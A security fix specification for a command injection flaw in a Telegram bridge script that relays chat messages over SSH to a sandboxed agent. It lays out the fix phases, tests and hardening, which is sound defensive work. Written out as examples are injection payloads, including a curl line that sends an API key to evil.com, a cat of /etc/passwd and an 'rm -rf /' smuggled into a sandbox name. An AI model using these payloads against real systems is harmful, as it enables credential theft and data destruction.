# Spec: Fix Command Injection in Telegram Bridge

## Problem Statement

**Issue:** #118 — Command injection vulnerability in `scripts/telegram-bridge.js`

The Telegram bridge interpolates user messages directly into a shell command string passed to SSH. The current escaping (single-quote replacement via `shellQuote`) does not prevent `$()` or backtick expansion, allowing attackers to execute arbitrary commands inside the sandbox and potentially exfiltrate the `NVIDIA_API_KEY`.

### Vulnerable Code Path

```js
const cmd = `export NVIDIA_API_KEY=${shellQuote(API_KEY)} && nemoclaw-start openclaw agent --agent main --local -m ${shellQuote(message)} --session-id ${shellQuote("tg-" + safeSessionId)}`;

const proc = spawn("ssh", ["-T", "-F", confPath, `openshell-${SANDBOX}`, cmd], {
  stdio: ["ignore", "pipe", "pipe"],
});
```

Even with `shellQuote`, the message is still embedded in a shell command string that gets interpreted by the remote shell, enabling injection via `$()`, backticks, or other shell metacharacters.

### Attack Vector

An attacker who:

1. Has access to the Telegram bot token, OR
2. Is in a chat that the bot accepts (if `ALLOWED_CHAT_IDS` is unset, **all chats are accepted**)

And knows the sandbox name, can send a message like:

- `$(cat /etc/passwd)` — command substitution
- `` `whoami` `` — backtick expansion
- `'; curl http://evil.com?key=$NVIDIA_API_KEY #` — quote escape + exfiltration

This could execute arbitrary commands in the sandbox and exfiltrate credentials.

### Access Control Context

The `ALLOWED_CHAT_IDS` environment variable is an **optional** comma-separated list of Telegram chat IDs:

```js
const ALLOWED_CHATS = process.env.ALLOWED_CHAT_IDS
  ? process.env.ALLOWED_CHAT_IDS.split(",").map((s) => s.trim())
  : null;
```

If unset, the bot accepts messages from **any** Telegram chat, significantly expanding the attack surface.

## Solution

Pass the user message and API key via **stdin** instead of shell string interpolation. The remote script reads these values using `read` and `cat`, then expands them inside double-quoted `"$VAR"` which prevents further shell parsing.

Additionally, apply defense-in-depth hardening identified in the PR #119 security review.

## Phases

### Phase 1: Input Validation Hardening [COMPLETED: d1fe154]

**Goal:** Add strict validation for `SANDBOX_NAME` and `sessionId` to reject shell metacharacters and prevent option injection.

**Changes:**

1. Improve `SANDBOX_NAME` regex to require alphanumeric first character: `/^[A-Za-z0-9][A-Za-z0-9_-]*$/`
   - This prevents option injection (e.g., `-v`, `--help` being interpreted as flags)
2. Sanitize `sessionId` to strip any non-alphanumeric characters
3. Return early with error if sessionId is empty after sanitization
4. Add message length cap of 4096 characters (matches Telegram's own limit)

**Files:**

- `scripts/telegram-bridge.js`

**Acceptance Criteria:**

- [x] `SANDBOX_NAME` with metacharacters (e.g., `foo;rm -rf /`) causes startup to exit with error
- [x] `SANDBOX_NAME` starting with hyphen (e.g., `-v`, `--help`) causes startup to exit with error
- [x] `sessionId` containing special characters gets sanitized to safe value
- [x] Empty sessionId after sanitization returns error response
- [x] Messages longer than 4096 characters are rejected with user-friendly error

### Phase 2: Stdin-Based Credential and Message Passing [COMPLETED: d1fe154]

**Goal:** Eliminate shell injection by passing sensitive data via stdin instead of command string.

**Changes:**

1. Change `stdio` from `["ignore", "pipe", "pipe"]` to `["pipe", "pipe", "pipe"]` to enable stdin
2. Construct remote script that:
   - Reads API key from first line of stdin: `read -r NVIDIA_API_KEY`
   - Exports it: `export NVIDIA_API_KEY`
   - Reads message from remaining stdin: `MSG=$(cat)`
   - Executes nemoclaw-start with `"$MSG"` (double-quoted variable)
3. Write API key + newline to stdin, then message, then close stdin
4. Remove the `shellQuote` calls for message and API key (no longer needed)

**Remote script template:**

```bash
read -r NVIDIA_API_KEY && export NVIDIA_API_KEY && MSG=$(cat) && exec nemoclaw-start openclaw agent --agent main --local -m "$MSG" --session-id "tg-$SESSION_ID"
```

**Files:**

- `scripts/telegram-bridge.js`

**Acceptance Criteria:**

- [x] Normal messages work correctly — agent responds
- [x] Message containing `$(whoami)` is treated as literal text
- [x] Message containing backticks is treated as literal text
- [x] Message containing single quotes is treated as literal text
- [x] `NVIDIA_API_KEY` no longer appears in process arguments (verify via `ps aux`)
- [x] API key is successfully read by remote script and used for inference

### Phase 3: Additional Security Hardening [COMPLETED: d1fe154]

**Goal:** Address remaining security gaps identified in PR #119 security review.

**Changes:**

1. **Use `execFileSync` instead of `execSync`** for ssh-config call to avoid shell interpretation:

   ```js
   // Before
   const sshConfig = execSync(`openshell sandbox ssh-config ${SANDBOX}`, { encoding: "utf-8" });

   // After
   const sshConfig = execFileSync(OPENSHELL, ["sandbox", "ssh-config", SANDBOX], { encoding: "utf-8" });
   ```

2. **Use resolved `OPENSHELL` path consistently** — the script already resolves the path at startup but wasn't using it everywhere

3. **Use cryptographically random temp file paths** to prevent symlink race attacks (CWE-377):

   ```js
   // Before (predictable)
   const confPath = `/tmp/nemoclaw-tg-ssh-${safeSessionId}.conf`;

   // After (unpredictable + exclusive creation)
   const confDir = fs.mkdtempSync("/tmp/nemoclaw-tg-ssh-");
   const confPath = `${confDir}/config`;
   fs.writeFileSync(confPath, sshConfig, { mode: 0o600 });
   ```

**Files:**

- `scripts/telegram-bridge.js`

**Acceptance Criteria:**

- [x] `execFileSync` used for all external command calls (no shell interpretation)
- [x] Resolved `OPENSHELL` path used consistently throughout
- [x] Temp SSH config files use unpredictable paths
- [x] Temp files created with exclusive flag and restrictive permissions (0o600)
- [x] Temp files cleaned up after use

### Phase 4: Test Coverage [COMPLETED: f23a0b9]

**Goal:** Add unit and integration tests for the security fix, and fix E2E test to exercise real code paths.

**Background:** PR #1092 review feedback from @cv identified that `test/e2e/test-telegram-injection.sh` uses ad-hoc SSH commands (`MSG=$(cat) && echo ...`) instead of exercising the actual `runAgentInSandbox()` function in `telegram-bridge.js`. This makes the test validate the concept but not the production code path.

**Changes:**

1. Add unit tests for input validation:
   - `SANDBOX_NAME` regex (valid names, metacharacters, leading hyphens)
   - `sessionId` sanitization
   - Message length validation
2. Add integration test that verifies injection payloads are treated as literal text
3. Add test that API key is not visible in process list
4. Add test for temp file cleanup
5. **Update `test/e2e/test-telegram-injection.sh`** to exercise real `runAgentInSandbox()`:
   - Create a test harness that imports/invokes the actual function from `telegram-bridge.js`
   - Or refactor `runAgentInSandbox()` to be exportable and testable
   - Verify the actual stdin-based message passing path, not ad-hoc SSH commands

**Files:**

- `test/telegram-bridge.test.js` (new file)
- `test/e2e/test-telegram-injection.sh` (update to use real code paths)
- `scripts/telegram-bridge.js` (may need minor refactor to export `runAgentInSandbox` for testing)

**Acceptance Criteria:**

- [x] Unit tests pass for validation functions
- [x] Integration test confirms `$(...)` in message doesn't execute
- [x] Test confirms API key not in process arguments
- [x] Test confirms temp files are cleaned up
- [x] E2E test exercises actual `runAgentInSandbox()` function, not ad-hoc SSH
- [x] All existing tests still pass (694 tests pass)

## Security Considerations

- **Defense in depth:** Multiple layers — input validation, stdin passing, parameterized execution
- **Principle of least privilege:** Credentials never appear in command lines or process arguments
- **Option injection prevention:** SANDBOX_NAME must start with alphanumeric character
- **Race condition prevention:** Cryptographically random temp file paths with exclusive creation
- **Backwards compatibility:** No API changes; existing bot configurations work unchanged

## Related PRs

- **PR #119** (upstream): Original fix this spec is based on
- **PR #320** (upstream): Additional hardening (execFileSync, temp file races, better regex)
- **PR #617** (upstream): Bridge framework refactor — if merged first, changes apply to `bridge-core.js` instead
- **PR #699** (upstream): `ALLOWED_CHAT_IDS` warning/opt-in behavior — out of scope for this fix, separate concern
- **PR #897** (upstream): Env var propagation fix in `bin/nemoclaw.js` — separate file, no conflict
- **PR #1092** (upstream): Added E2E tests for telegram-injection; @cv's review noted tests don't exercise real `runAgentInSandbox()` — we address this in Phase 4

## Test Plan

### Manual Testing

1. Send a normal message via Telegram → agent responds correctly
2. Send `$(whoami)` → appears literally in response, no command execution
3. Send message with backticks and single quotes → no injection
4. Send message longer than 4096 chars → rejected with error
5. Set `SANDBOX_NAME=foo;rm -rf /` → startup exits with error
6. Set `SANDBOX_NAME=-v` → startup exits with error
7. Run `ps aux | grep NVIDIA_API_KEY` while agent is running → no matches
8. Check `/tmp/` for lingering config files after agent exits → none

### Automated Testing

- Unit tests for validation functions (SANDBOX_NAME, sessionId, message length)
- Integration tests with mock SSH that captures stdin
- Verify no shell metacharacters reach shell interpretation
- Verify temp file cleanup

## Rollback Plan

If issues arise, revert the commit. The fix is contained to a single file with clear boundaries.
